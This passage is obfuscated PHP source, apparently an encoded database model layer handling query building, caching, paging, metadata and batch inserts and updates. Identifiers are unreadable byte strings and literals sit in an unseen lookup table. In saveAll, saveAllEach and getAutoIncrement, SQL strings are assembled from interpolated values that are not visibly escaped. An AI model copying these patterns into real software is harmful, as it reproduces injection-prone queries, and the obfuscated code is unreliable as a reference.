$èãÙ™ûâ = null, $ ¬øôüØ = '') { $Çìø¸«Á =& $_SERVER[¶Ô„œ…¯]; if (!1 !== $ÆËì¿÷²) { $this->options[$Çìø¸«Á[426]] = array($Çìø¸«Á[97] => $ÆËì¿÷², $Çìø¸«Á[416] => $èãÙ™ûâ, $Çìø¸«Á[33] => $ ¬øôüØ); } return $this; } public function field($¹ŞŸäÁå, $Ï§Öé‹ã = false) { $ÍäÌ®ÖÙ =& $_SERVER[¶Ô„œ…¯]; if (!0 === $¹ŞŸäÁå) { $ÒÁøø¨ = $this->getDbFields(); $¹ŞŸäÁå = $ÒÁøø¨ ? $ÒÁøø¨ : $ÍäÌ®ÖÙ[222]; } elseif ($Ï§Öé‹ã) { if (is_string($¹ŞŸäÁå)) { $¹ŞŸäÁå = explode($ÍäÌ®ÖÙ[50], $¹ŞŸäÁå); } $ÒÁøø¨ = $this->getDbFields(); $¹ŞŸäÁå = $ÒÁøø¨ ? array_diff($ÒÁøø¨, $¹ŞŸäÁå) : $¹ŞŸäÁå; } $this->options[$ÍäÌ®ÖÙ[352]] = $¹ŞŸäÁå; return $this; } public function scope($Êœñ÷ğ = '', $ƒË‰‹× = NULL) { $à¿Ã×ò =& $_SERVER[¶Ô„œ…¯]; if ($à¿Ã×ò[12] === $Êœñ÷ğ) { if (isset($this->_scope[$à¿Ã×ò[37]])) { $èµÀ»£¨ = $this->_scope[$à¿Ã×ò[37]]; } else { return $this; } } elseif (is_string($Êœñ÷ğ)) { $†ÓÌÕ½´ = explode($à¿Ã×ò[50], $Êœñ÷ğ); $èµÀ»£¨ = array(); foreach ($†ÓÌÕ½´ as $¹¦¼ªÆš) { if (!isset($this->_scope[$¹¦¼ªÆš])) { continue; } $èµÀ»£¨ = array_merge($èµÀ»£¨, $this->_scope[$¹¦¼ªÆš]); } if (!empty($ƒË‰‹×) && is_array($ƒË‰‹×)) { $èµÀ»£¨ = array_merge($èµÀ»£¨, $ƒË‰‹×); } } elseif (is_array($Êœñ÷ğ)) { $èµÀ»£¨ = $Êœñ÷ğ; } if (is_array($èµÀ»£¨) && !empty($èµÀ»£¨)) { $this->options = array_merge($this->options, array_change_key_case($èµÀ»£¨)); } return $this; } public function where($Í‰¡„», $‡©Ñğç± = null) { $Œ¬‡‹… =& $_SERVER[¶Ô„œ…¯]; if (!is_null($‡©Ñğç±) && is_string($Í‰¡„»)) { if (!is_array($‡©Ñğç±)) { $‡©Ñğç± = func_get_args(); array_shift($‡©Ñğç±); } $‡©Ñğç± = array_map(array($this->db, $Œ¬‡‹…[420]), $‡©Ñğç±); $Í‰¡„» = vsprintf($Í‰¡„», $‡©Ñğç±); } elseif (is_object($Í‰¡„»)) { $Í‰¡„» = get_object_vars($Í‰¡„»); } elseif (is_array($Í‰¡„»)) { foreach ($Í‰¡„» as $èªÔ‹Ó› => $ÀÚÒéÕ¶) { if ((is_numeric($èªÔ‹Ó›) || !$èªÔ‹Ó›) && is_string($ÀÚÒéÕ¶)) { if (strpos($ÀÚÒéÕ¶, $Œ¬‡‹…[427]) === 0) { continue; } think_trace($Œ¬‡‹…[428], $Œ¬‡‹…[12], $Œ¬‡‹…[49]); die; } } } if (is_string($Í‰¡„») && $Œ¬‡‹…[12] != $Í‰¡„») { $ÈŠµ€ï = array(); $ÈŠµ€ï[$Œ¬‡‹…[429]] = $Í‰¡„»; $Í‰¡„» = $ÈŠµ€ï; } if (isset($this->options[$Œ¬‡‹…[354]])) { $this->options[$Œ¬‡‹…[354]] = array_merge($this->options[$Œ¬‡‹…[354]], $Í‰¡„»); } else { $this->options[$Œ¬‡‹…[354]] = $Í‰¡„»; } return $this; } public function limit($ŸÔñ©İò, $äşªí¬ = null) { $¼í§òŞÜ =& $_SERVER[¶Ô„œ…¯]; $this->options[$¼í§òŞÜ[369]] = is_null($äşªí¬) ? $ŸÔñ©İò : $ŸÔñ©İò . $¼í§òŞÜ[50] . $äşªí¬; return $this; } public function page($Á±§ï, $ü™¸ìÍ´ = null) { $—úôÔ…ı =& $_SERVER[¶Ô„œ…¯]; $this->options[$—úôÔ…ı[430]] = is_null($ü™¸ìÍ´) ? $Á±§ï : $Á±§ï . $—úôÔ…ı[50] . $ü™¸ìÍ´; return $this; } public function comment($ì¢õå¬²) { $this->options[$_SERVER[¶Ô„œ…¯][431]] = $ì¢õå¬²; return $this; } public function setProperty($àÄéÌÚõ, $æ£¢â›¦) { if (property_exists($this, $àÄéÌÚõ)) { $this->{$àÄéÌÚõ} = $æ£¢â›¦; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\155\145", "\164\151\x6d\145", "\x69\x6e\163\145\x72\x74\54\x75\x70\x64\141\x74\x65", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\x63\162\145\141\164\145\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\x65\162\164", "\146\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($ŒüÏñİ£) { $this->dataAuto = $ŒüÏñİ£; } public function __construct($üù¹å‹ñ = '', $Í÷×ä¹ú = '', $­·¿›ã = '') { parent::__construct($üù¹å‹ñ, $Í÷×ä¹ú, $­·¿›ã); } protected $tableMeta = array(); protected function _beforeInsert(&$¯”¹ñ, $â¼½Çø) { $¤ÚÛ„ø– =& $_SERVER[¶Ô„œ…¯]; if (!$this->checkDataAutoHas($¤ÚÛ„ø–[432])) { return; } $this->dataBeforeFilter($¯”¹ñ, $¤ÚÛ„ø–[432]); } protected function _beforeUpdate(&$£‡ü²éÏ, $ÁÉ©ó¥Ì) { $Ù´›ôö =& $_SERVER[¶Ô„œ…¯]; if (!$this->checkDataAutoHas($Ù´›ôö[433])) { return; } $this->dataBeforeFilter($£‡ü²éÏ, $Ù´›ôö[433]); } protected function _afterSelect(&$›æª¶, $øŠ¸¢¥) { if (!is_array($›æª¶)) { return; } if (!$this->checkDataAutoHas($_SERVER[¶Ô„œ…¯][434])) { return; } foreach ($›æª¶ as &$é‰¤éÒÉ) { $this->dataAfterFilter($é‰¤éÒÉ); } unset($é‰¤éÒÉ); } protected function _afterFind(&$ùßİŞı, $‘¸Şş¿) { if (!is_array($ùßİŞı)) { return; } if (!$this->checkDataAutoHas($_SERVER[¶Ô„œ…¯][434])) { return; } $this->dataAfterFilter($ùßİŞı); } public static function textEncode($øå ƒä›) { if (!$øå ƒä›) { return $øå ƒä›; } $ğû³–äØ = json_encode($øå ƒä›); $ğû³–äØ = preg_replace_callback($_SERVER[¶Ô„œ…¯][435], function ($ —Õôä…) { return addslashes($ —Õôä…[0]); }, $ğû³–äØ); return json_decode($ğû³–äØ); } public static function textDecode($ˆœ¶‘‰§) { $‡Û‹ğ“ =& $_SERVER[¶Ô„œ…¯]; $Å³§²øô = json_encode($ˆœ¶‘‰§); $Å³§²øô = preg_replace_callback($‡Û‹ğ“[436], function ($¥¯€ÍÚ) { return $_SERVER[¶Ô„œ…¯][100]; }, $Å³§²øô); return json_decode($Å³§²øô); } public function setAutoIncrement($ÈÈİÖç) { $ û·ıÉ‚ = array($this->getPk() => $ÈÈİÖç); $ÖÖéµÒÜ = $this->data($ û·ıÉ‚)->add(); if ($ÖÖéµÒÜ) { $this->delete($ÖÖéµÒÜ); } } public function getAutoIncrement() { $ õ›è = $this->getTableName(); $¥Ô†îŠ¦ = $this->max($this->getPk()); $Áé„šÆ = $this->query("\163\150\x6f\x77\x20\164\x61\x62\x6c\145\40\x73\x74\141\x74\165\163\x20\167\150\x65\162\145\x20\116\x61\x6d\145\x3d\x27{$ õ›è}\x27"); $›—™ß°ß = $Áé„šÆ[0][$_SERVER[¶Ô„œ…¯][437]]; $É§ï‘­© = max($¥Ô†îŠ¦, $›—™ß°ß); return $É§ï‘­©; } protected function _callBefore($ìÈîé©³, $ÄÓÀİüò) { return $this->cacheCallCheck($ìÈîé©³, $ÄÓÀİüò, !1); } protected function _callAfter($”ï‡¥©æ, $°§ê¤·…) { return $this->cacheCallCheck($”ï‡¥©æ, $°§ê¤·…, !0); } protected function cacheFunctionAlias($£ÇÒ¶±) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ä®‘ƒ½Ó, $³Ş¯ », $°‰§‹’ü = false) { $àÄ÷¿¿ó =& $_SERVER[¶Ô„œ…¯]; $“şù¥Œú = $this->cacheFunctionAlias($³Ş¯ »); if (!$“şù¥Œú) { return; } foreach ($“şù¥Œú as $Ú”©î« => $ùÎÅÕ˜) { $ÊÒ®ëê = $ùÎÅÕ˜[0]; $ü³ş¿”“ = explode($àÄ÷¿¿ó[50], $ùÎÅÕ˜[1]); $í¼ÛÁ · = isset($ùÎÅÕ˜[2]) ? $ùÎÅÕ˜[2] : $àÄ÷¿¿ó[12]; if ($ä®‘ƒ½Ó == $Ú”©î«) { return $this->cacheFunctionGet($Ú”©î«, $ÊÒ®ëê, $í¼ÛÁ ·); } if ($°‰§‹’ü && in_array($ä®‘ƒ½Ó, $ü³ş¿”“)) { $this->cacheFunctionClear($Ú”©î«, $ÊÒ®ëê, $í¼ÛÁ ·); } } } public function cacheFunctionGet($ĞÛ³Ÿ®ö, $œÄÍÔû, $åÖ†àäÕ = '') { $¡Ä©ô­ = $this->cacheKeyMake($ĞÛ³Ÿ®ö, $œÄÍÔû, $åÖ†àäÕ); $È†§­İ = Cache::get($¡Ä©ô­); if (!is_array($È†§­İ)) { $È†§­İ = call_user_func_array(array($this, $ĞÛ³Ÿ®ö), array($œÄÍÔû, !0)); Cache::set($¡Ä©ô­, $È†§­İ); } return $È†§­İ; } public function cacheFunctionClear($Ï¡½£İÂ, $™ ­İ—¶, $¡ÉÆ©â = '') { $Šï¬®Ÿ– = $™ ­İ—¶; if (!is_array($™ ­İ—¶)) { $Šï¬®Ÿ– = array($™ ­İ—¶); } foreach ($Šï¬®Ÿ– as $ÈÉ¨ÒÄ) { $àİíŞÖ = $this->cacheKeyMake($Ï¡½£İÂ, $ÈÉ¨ÒÄ, $¡ÉÆ©â); Cache::remove($àİíŞÖ); } } private function cacheKeyMake($–€ì–£õ, $ËØõ Òå, $–¦³–å) { $Ÿ–¯Ë•ƒ =& $_SERVER[¶Ô„œ…¯]; if ($–¦³–å) { $ËØõ Òå = $ËØõ Òå . $Ÿ–¯Ë•ƒ[438] . $–¦³–å; } return get_class($this) . $Ÿ–¯Ë•ƒ[11] . $–€ì–£õ . $Ÿ–¯Ë•ƒ[439] . $ËØõ Òå; } protected function selectPageReset() { $êÏÍß•Ù =& $_SERVER[¶Ô„œ…¯]; if (isset($GLOBALS[$êÏÍß•Ù[440]])) { return; } $GLOBALS[$êÏÍß•Ù[440]] = isset($GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[441]]) ? $GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[441]] : !1; $GLOBALS[$êÏÍß•Ù[442]] = isset($GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[430]]) ? $GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[430]] : !1; $GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[441]] = !1; $GLOBALS[$êÏÍß•Ù[7]][$êÏÍß•Ù[430]] = !1; } protected function selectPageRestore() { $ªÙ‘­‡¿ =& $_SERVER[¶Ô„œ…¯]; if (!isset($GLOBALS[$ªÙ‘­‡¿[440]])) { return; } $GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[441]] = $GLOBALS[$ªÙ‘­‡¿[440]]; $GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[430]] = $GLOBALS[$ªÙ‘­‡¿[442]]; if ($GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[441]] === !1) { unset($GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[441]]); } if ($GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[430]] === !1) { unset($GLOBALS[$ªÙ‘­‡¿[7]][$ªÙ‘­‡¿[430]]); } unset($GLOBALS[$ªÙ‘­‡¿[440]]); unset($GLOBALS[$ªÙ‘­‡¿[442]]); } protected function selectPage($ˆšıÇí‘ = 200, $Á†”¦É = 1) { $Çìœ„²® =& $_SERVER[¶Ô„œ…¯]; global $in; $ËéüÆİÓ = $this->optionsValue(); $Ş¦îîûË = 50000; $ˆšıÇí‘ = isset($in[$Çìœ„²®[441]]) && $in[$Çìœ„²®[441]] ? $in[$Çìœ„²®[441]] : $ˆšıÇí‘; if ($ˆšıÇí‘ === -1) { $in[$Çìœ„²®[441]] = !1; $Ş¦îîûË = 100000000; $ˆšıÇí‘ = $Ş¦îîûË; } $ ™õ§şÊ = $ËéüÆİÓ; $ ™õ§şÊ[$Çìœ„²®[443]] = array(); $ˆšıÇí‘ = intval($ˆšıÇí‘); $ˆšıÇí‘ = $ˆšıÇí‘ <= 5 ? 5 : ($ˆšıÇí‘ >= $Ş¦îîûË ? $Ş¦îîûË : $ˆšıÇí‘); $Á†”¦É = intval(isset($in[$Çìœ„²®[430]]) && $in[$Çìœ„²®[430]] ? $in[$Çìœ„²®[430]] : $Á†”¦É); $Á†”¦É = $Á†”¦É <= 1 ? 1 : $Á†”¦É; $ÄÓ¡¹Š¶ = array(); $è …šĞ = 1; if ($Á†”¦É == 1 && $è …šĞ) { $this->optionsValue($ËéüÆİÓ); $ÄÓ¡¹Š¶ = $this->page($Á†”¦É, $ˆšıÇí‘)->select(); $Ø‡¸ïáˆ = is_array($ÄÓ¡¹Š¶) ? count($ÄÓ¡¹Š¶) : 0; if ($Ø‡¸ïáˆ < $ˆšıÇí‘) { $ƒíù˜Ãê = 1; } else { $this->optionsValue($ ™õ§şÊ); $Ø‡¸ïáˆ = intval($this->count()); $ƒíù˜Ãê = ceil($Ø‡¸ïáˆ / $ˆšıÇí‘); } } else { $this->optionsValue($ ™õ§şÊ); $Ø‡¸ïáˆ = intval($this->count()); $ƒíù˜Ãê = ceil($Ø‡¸ïáˆ / $ˆšıÇí‘); $Á†”¦É = $Á†”¦É >= $ƒíù˜Ãê ? $ƒíù˜Ãê : $Á†”¦É; $this->optionsValue($ËéüÆİÓ); $ÄÓ¡¹Š¶ = $this->page($Á†”¦É, $ˆšıÇí‘)->select(); } if (!is_array($ÄÓ¡¹Š¶)) { $ÄÓ¡¹Š¶ = array(); } if ($ƒíù˜Ãê == 1) { $Ø‡¸ïáˆ = count($ÄÓ¡¹Š¶); } $Ğ¸ „•Ó = array($Çìœ„²®[444] => array($Çìœ„²®[445] => $Ø‡¸ïáˆ, $Çìœ„²®[441] => $ˆšıÇí‘, $Çìœ„²®[430] => $Á†”¦É, $Çìœ„²®[446] => $ƒíù˜Ãê), $Çìœ„²®[447] => $ÄÓ¡¹Š¶); return $Ğ¸ „•Ó; } protected function checkLength($‹É¬ˆÍ´, $ç§ÈÊãù = 0, $‘¨ü‹Ğ = '') { $¬£Å§É =& $_SERVER[¶Ô„œ…¯]; $ç§ÈÊãù = $ç§ÈÊãù ? $ç§ÈÊãù : 65536; if (!$‹É¬ˆÍ´ || strlen($‹É¬ˆÍ´) < $ç§ÈÊãù) { return; } $‘¨ü‹Ğ = $‘¨ü‹Ğ ? $‘¨ü‹Ğ . $¬£Å§É[74] : $¬£Å§É[12]; show_json($‘¨ü‹Ğ . LNG($¬£Å§É[448]) . "\x28{$ç§ÈÊãù}\x29", !1); } protected function metaSet($ÌØ¨Íåğ, $º›²­™è = null, $Ó®ÁÅİ = null) { $ŸƒêœÑ© =& $_SERVER[¶Ô„œ…¯]; if (!$this->tableMeta || !$ÌØ¨Íåğ) { return !1; } $õ°•¿íŒ = $this->tableMeta[$ŸƒêœÑ©[449]]; $òò˜‹ĞÁ = $this->tableMeta[$ŸƒêœÑ©[450]]; $ÁÈè‚¤Ä = Model($òò˜‹ĞÁ); $êÀÌÉ²˜ = array($õ°•¿íŒ => $ÌØ¨Íåğ, $ŸƒêœÑ©[451] => $º›²­™è); if (is_null($º›²­™è)) { return $ÁÈè‚¤Ä->where(array($õ°•¿íŒ => $ÌØ¨Íåğ))->delete(); } if (is_null($Ó®ÁÅİ) && is_string($º›²­™è)) { return $ÁÈè‚¤Ä->where($êÀÌÉ²˜)->delete(); } $ÏèëÉåš = is_array($º›²­™è) ? $º›²­™è : array(); if (is_string($º›²­™è)) { $ÏèëÉåš[$º›²­™è] = $Ó®ÁÅİ; } $æ¬•èáş = array(); foreach ($ÏèëÉåš as $·„»òĞ€ => $™Ë‘‹•) { if (is_null($™Ë‘‹•) && is_string($·„»òĞ€)) { $ÁÈè‚¤Ä->where(array($õ°•¿íŒ => $ÌØ¨Íåğ, $ŸƒêœÑ©[451] => $·„»òĞ€))->delete(); continue; } $this->checkLength($™Ë‘‹•, !1, $òò˜‹ĞÁ . $ŸƒêœÑ©[4] . $·„»òĞ€); $æ¬•èáş[] = array($õ°•¿íŒ => $ÌØ¨Íåğ, $ŸƒêœÑ©[97] => $·„»òĞ€, $ŸƒêœÑ©[452] => $™Ë‘‹•); } $ß“û¤ÍŒ = $ŸƒêœÑ©[453] . $òò˜‹ĞÁ; CacheLock::lock($ß“û¤ÍŒ); $ÁÈè‚¤Ä->where(array($õ°•¿íŒ => $ÌØ¨Íåğ))->addAll($æ¬•èáş, array(), !0); CacheLock::unlock($ß“û¤ÍŒ); return !0; } public function metaGet($Ã„÷ıÔş, $ŞßË©İ’ = false) { $Ûê˜éƒ =& $_SERVER[¶Ô„œ…¯]; if (!$this->tableMeta) { return array(); } $İÏ“ëÏ = $this->tableMeta[$Ûê˜éƒ[449]]; $ğĞî“È… = Model($this->tableMeta[$Ûê˜éƒ[450]]); if ($ŞßË©İ’) { $²¬ô¼û = array($İÏ“ëÏ => $Ã„÷ıÔş, $Ûê˜éƒ[97] => $ŞßË©İ’); return $ğĞî“È…->where($²¬ô¼û)->getField($Ûê˜éƒ[452]); } $²¬ô¼û = array($İÏ“ëÏ => $Ã„÷ıÔş); $˜†§¥³À = $ğĞî“È…->field($Ûê˜éƒ[454])->where($²¬ô¼û)->select(); $˜†§¥³À = array_to_keyvalue($˜†§¥³À, $Ûê˜éƒ[97], $Ûê˜éƒ[452]); return $˜†§¥³À; } private function checkDataAutoHas($ÁØ¨Ò°—) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $×ĞìºÜù) { if (in_array($ÁØ¨Ò°—, explode($_SERVER[¶Ô„œ…¯][50], $×ĞìºÜù[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$İµŸüï¬, $…×Œİû) { $ûû‡İ¢£ =& $_SERVER[¶Ô„œ…¯]; if (!is_array($İµŸüï¬)) { return; } foreach ($this->dataAuto as $ˆÒ¥„Ó˜) { $áØ“Õ¨• = $ˆÒ¥„Ó˜[0]; if (!in_array($…×Œİû, explode($ûû‡İ¢£[50], $ˆÒ¥„Ó˜[2]))) { continue; } switch (trim($ˆÒ¥„Ó˜[3])) { case $ûû‡İ¢£[398]: case $ûû‡İ¢£[399]: $‚±ò˜øÉ = $ˆÒ¥„Ó˜[1]; $ÍÙšÒğì = isset($ˆÒ¥„Ó˜[4]) ? (array) $ˆÒ¥„Ó˜[4] : array(); if ($‚±ò˜øÉ == $ûû‡İ¢£[206] && array_key_exists($áØ“Õ¨•, $İµŸüï¬)) { if (!$İµŸüï¬[$áØ“Õ¨•]) { unset($İµŸüï¬[$áØ“Õ¨•]); } break; } if (isset($İµŸüï¬[$áØ“Õ¨•])) { array_unshift($ÍÙšÒğì, $İµŸüï¬[$áØ“Õ¨•]); } if ($ûû‡İ¢£[398] == $ˆÒ¥„Ó˜[3]) { $İµŸüï¬[$áØ“Õ¨•] = call_user_func_array($‚±ò˜øÉ, $ÍÙšÒğì); } else { $İµŸüï¬[$áØ“Õ¨•] = call_user_func_array(array(&$this, $‚±ò˜øÉ), $ÍÙšÒğì); } break; case $ûû‡İ¢£[349]: if (isset($İµŸüï¬[$áØ“Õ¨•]) && $İµŸüï¬[$áØ“Õ¨•]) { $İµŸüï¬[$áØ“Õ¨•] = call_user_func_array(array(&$this, $ˆÒ¥„Ó˜[1]), array($İµŸüï¬[$áØ“Õ¨•])); } break; case $ûû‡İ¢£[352]: $İµŸüï¬[$áØ“Õ¨•] = $İµŸüï¬[$ˆÒ¥„Ó˜[1]]; break; case $ûû‡İ¢£[371]: if (isset($İµŸüï¬[$áØ“Õ¨•]) && !is_string($İµŸüï¬[$áØ“Õ¨•])) { $İµŸüï¬[$áØ“Õ¨•] = json_encode_force($İµŸüï¬[$áØ“Õ¨•]); } break; case $ûû‡İ¢£[400]: if ($İµŸüï¬[$áØ“Õ¨•] === $ûû‡İ¢£[12]) { unset($İµŸüï¬[$áØ“Õ¨•]); } break; case $ûû‡İ¢£[401]: $İµŸüï¬[$áØ“Õ¨•] = $ˆÒ¥„Ó˜[1]; default: break; } } if ($…×Œİû == $ûû‡İ¢£[432]) { $š¼œÆ¾š = strtolower($this->db->getDbType()); if (strpos($š¼œÆ¾š, $ûû‡İ¢£[13]) !== 0) { return; } $×Íü¢±œ = $this->field(!0)->fields; $•À»±Úí = $×Íü¢±œ[$ûû‡İ¢£[331]]; if (isset($×Íü¢±œ[$ûû‡İ¢£[330]])) { unset($•À»±Úí[$×Íü¢±œ[$ûû‡İ¢£[330]]]); } foreach ($•À»±Úí as $šà±Õ‹¥ => $…×Œİû) { if (!isset($İµŸüï¬[$šà±Õ‹¥])) { $İµŸüï¬[$šà±Õ‹¥] = $ûû‡İ¢£[12]; } } } } private function dataAfterFilter(&$…Çèù©·) { $ÂşçÃ¸ı =& $_SERVER[¶Ô„œ…¯]; foreach ($this->dataAuto as $÷¼Ú”¢) { $Ú½Âìñò = $÷¼Ú”¢[0]; if (!isset($…Çèù©·[$Ú½Âìñò])) { continue; } if (!in_array($ÂşçÃ¸ı[434], explode($ÂşçÃ¸ı[50], $÷¼Ú”¢[2]))) { continue; } switch (trim($÷¼Ú”¢[3])) { case $ÂşçÃ¸ı[398]: case $ÂşçÃ¸ı[399]: $ ÅÔ’û = isset($÷¼Ú”¢[4]) ? (array) $÷¼Ú”¢[4] : array(); array_unshift($ ÅÔ’û, $…Çèù©·[$Ú½Âìñò]); if (isset($÷¼Ú”¢[4]) && $÷¼Ú”¢[4] == $ÂşçÃ¸ı[455]) { $ ÅÔ’û = array($…Çèù©·[$Ú½Âìñò]); } if ($ÂşçÃ¸ı[398] == $÷¼Ú”¢[3]) { $…Çèù©·[$Ú½Âìñò] = call_user_func_array($÷¼Ú”¢[1], $ ÅÔ’û); } else { $…Çèù©·[$Ú½Âìñò] = call_user_func_array(array(&$this, $÷¼Ú”¢[1]), $ ÅÔ’û); } break; case $ÂşçÃ¸ı[349]: if (isset($…Çèù©·[$Ú½Âìñò]) && $…Çèù©·[$Ú½Âìñò]) { $…Çèù©·[$Ú½Âìñò] = call_user_func_array(array(&$this, $÷¼Ú”¢[1]), array($…Çèù©·[$Ú½Âìñò])); } break; case $ÂşçÃ¸ı[352]: $…Çèù©·[$Ú½Âìñò] = $…Çèù©·[$÷¼Ú”¢[1]]; break; case $ÂşçÃ¸ı[371]: $Â¨ÖÅşÌ = $…Çèù©·[$Ú½Âìñò]; $…Çèù©·[$Ú½Âìñò] = json_decode($Â¨ÖÅşÌ, !0); if (is_null($…Çèù©·[$Ú½Âìñò])) { $…Çèù©·[$Ú½Âìñò] = $Â¨ÖÅşÌ; } break; case $ÂşçÃ¸ı[400]: if ($…Çèù©·[$Ú½Âìñò] === $ÂşçÃ¸ı[12]) { unset($…Çèù©·[$Ú½Âìñò]); } break; case $ÂşçÃ¸ı[401]: $…Çèù©·[$Ú½Âìñò] = $÷¼Ú”¢[1]; break; default: break; } } } public function saveAll($Ê€îÜ¿ì) { $óÖ¸Æî =& $_SERVER[¶Ô„œ…¯]; $«ÍÓ­şò = $this->tablePrefix . $this->tableName; $ËşòöĞ— = self::SQL_WHERE_IN_CHUNK; $Ê€îÜ¿ì = is_array($Ê€îÜ¿ì) ? $Ê€îÜ¿ì : array(); $¦Ù­—£… = $óÖ¸Æî[456]; $×¹ÔÌĞ = 0; $³ƒ“¡Ù« = array(); $“ıºËÖ  = count($Ê€îÜ¿ì); for ($È•Ù³±Ÿ = 0; $È•Ù³±Ÿ < $“ıºËÖ ; $È•Ù³±Ÿ++) { $ÙúÜè©ï = $Ê€îÜ¿ì[$È•Ù³±Ÿ]; if (!is_array($ÙúÜè©ï) || count($ÙúÜè©ï) != 4) { continue; } $¤›©ô¢Ö = "\125\120\x44\101\x54\x45\40\x60{$«ÍÓ­şò}\140\40\123\x45\x54\x20{$ÙúÜè©ï[2]}\x20\75\x20\x43\x41\x53\x45\x20{$ÙúÜè©ï[0]}\40\12"; if ($×¹ÔÌĞ == 0) { $¦Ù­—£… = $¤›©ô¢Ö; } $³ƒ“¡Ù«[] = $óÖ¸Æî[121] . $ÙúÜè©ï[1] . $óÖ¸Æî[121]; $×¹ÔÌĞ++; $¦Ù­—£… .= "\x20\127\110\105\x4e\40\47{$ÙúÜè©ï[1]}\47\x20\x54\x48\105\x4e\40\47{$ÙúÜè©ï[3]}\47\40\12"; if ($×¹ÔÌĞ == $ËşòöĞ— || $È•Ù³±Ÿ == $“ıºËÖ  - 1) { $ÊÄé¸«õ = implode($óÖ¸Æî[50], $³ƒ“¡Ù«); $¦Ù­—£… .= "\x20\105\x4e\104\40\40\127\110\x45\x52\105\x20{$ÙúÜè©ï[0]}\x20\x49\116\40\x28{$ÊÄé¸«õ}\51\40"; $this->execute($¦Ù­—£…); $×¹ÔÌĞ = 0; $¦Ù­—£… = $¤›©ô¢Ö; $this->chunkEventCheck(count($³ƒ“¡Ù«)); $³ƒ“¡Ù« = array(); } } $this->chunkEventSet(); } public function saveAllEach($¤³àäÀê) { $üÌ¨¤‹ğ =& $_SERVER[¶Ô„œ…¯]; $± Ä¼õ† = $this->tablePrefix . $this->tableName; foreach ($¤³àäÀê as $ıØÖóÙı) { if (!is_array($ıØÖóÙı) || count($ıØÖóÙı) != 4) { continue; } $€¥ÉõºĞ = $ıØÖóÙı[0] . $üÌ¨¤‹ğ[457] . $ıØÖóÙı[1] . $üÌ¨¤‹ğ[121]; $ ÄÒ†¦š = $ıØÖóÙı[2] . $üÌ¨¤‹ğ[457] . $ıØÖóÙı[3] . $üÌ¨¤‹ğ[121]; $×‰ìËÚ¬ = "\165\x70\144\141\164\x65\x20{$± Ä¼õ†}\40\x73\145\164\40{$ ÄÒ†¦š}\x20\167\150\x65\x72\145\40{$€¥ÉõºĞ}\x3b"; $this->execute($×‰ìËÚ¬); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($±¤ğ³ù™ = false, $ìì„¾¼ö = false) { $this->_chunkEvent = $±¤ğ³ù™; $this->_chunkEventParam = $ìì„¾¼ö; } private function chunkEventCheck($ÔîÅ¼¯¢) { if (!$this->_chunkEvent) { return; } $ş•ğÒò = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ş•ğÒò[$_SERVER[¶Ô„œ…¯][458]] = $ÔîÅ¼¯¢; Hook::trigger($this->_chunkEvent, $ş•ğÒò); } public function addAll($–æøÓ¡ü, $´¤ÆÀ¡€ = array(), $íàè¡ = false) { $›ÉÄî†Ã =& $_SERVER[¶Ô„œ…¯]; ignore_timeout(); $ŒÆÂîáÉ = self::SQL_WHERE_IN_CHUNK; if (empty($–æøÓ¡ü)) { $this->error = think_lang($›ÉÄî†Ã[350]); return !1; } $´¤ÆÀ¡€ = $this->_parseOptions($´¤ÆÀ¡€); foreach ($–æøÓ¡ü as $µóĞ°”ï => $ä¶ËéÛ) { $–æøÓ¡ü[$µóĞ°”ï] = $this->_facade($ä¶ËéÛ); $this->_beforeInsert($–æøÓ¡ü[$µóĞ°”ï], $´¤ÆÀ¡€); } if (method_exists($this->db, $›ÉÄî†Ã[351])) { for ($ÂÄãÕšä = 0; $ÂÄãÕšä < count($–æøÓ¡ü); $ÂÄãÕšä += $ŒÆÂîáÉ) { $¶úÑ””ç = array_slice($–æøÓ¡ü, $ÂÄãÕšä, $ŒÆÂîáÉ); if (!is_array($¶úÑ””ç) || count($¶úÑ””ç) == 0) { break; } $¹æë¸—¦ = $this->db->insertAll($¶úÑ””ç, $´¤ÆÀ¡€, $íàè¡); $this->chunkEventCheck(count($¶úÑ””ç)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($–æøÓ¡ü as $µóĞ°”ï => $ä¶ËéÛ) { $¹æë¸—¦ = $this->db->insert($ä¶ËéÛ, $´¤ÆÀ¡€, $íàè¡); } $this->commit(); } if (!1 !== $¹æë¸—¦) { $‰ßïæ» = $this->getLastInsID(); if ($‰ßïæ») { return $‰ßïæ»; } } return $¹æë¸—¦; } public function save($²Ò—×Æ = '', $…Û×ã™› = array()) { $íêªÏ…½ =& $_SERVER[¶Ô„œ…¯]; $ÁÇ¸é¿º = self::SQL_WHERE_IN_CHUNK; $Ûó¾ÓíÉ = $this->optionsValue(); $¨£´ƒ±â = $this->findWhereField($Ûó¾ÓíÉ); if (!$¨£´ƒ±â) { return parent::save($²Ò—×Æ, $…Û×ã™›); } $‚“”øÜÆ = 0; $àœî»™² = $Ûó¾ÓíÉ[$íêªÏ…½[354]][$¨£´ƒ±â][1]; $àœî»™² = is_array($àœî»™²) ? $àœî»™² : array(); $ÆŸ–íï = count($àœî»™²); for ($ÒšŸË = 0; $ÒšŸË < $ÆŸ–íï; $ÒšŸË += $ÁÇ¸é¿º) { $‘÷ê’¯É = array_slice($àœî»™², $ÒšŸË, $ÁÇ¸é¿º); if (!is_array($‘÷ê’¯É) || count($‘÷ê’¯É) == 0) { break; } 